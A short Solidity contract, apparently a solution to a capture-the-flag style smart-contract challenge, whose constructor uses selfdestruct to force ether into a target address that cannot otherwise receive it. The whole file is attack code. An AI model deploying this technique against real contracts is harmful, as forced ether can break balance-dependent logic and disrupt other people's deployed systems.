// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    constructor(address _force) payable {
        selfdestruct(payable(_force));
    }
}
